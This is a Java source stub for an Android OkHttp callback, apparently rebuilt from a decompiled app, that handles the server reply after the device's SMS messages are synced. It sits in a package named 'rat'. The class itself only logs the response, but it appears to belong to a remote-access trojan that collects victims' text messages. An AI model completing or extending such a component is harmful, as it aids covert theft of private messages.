package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.a0 (SyncSmsCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * SyncSmsCallback - 短信同步回调
 * vendor: 解析 ApiResult<Boolean>，成功后标记 syncSmsMessage
 */
public final class a0 implements Callback {

    private static final String TAG = "SyncSmsCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<Boolean>, logs "设备短信已同步完成", saves syncSmsMessage flag
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
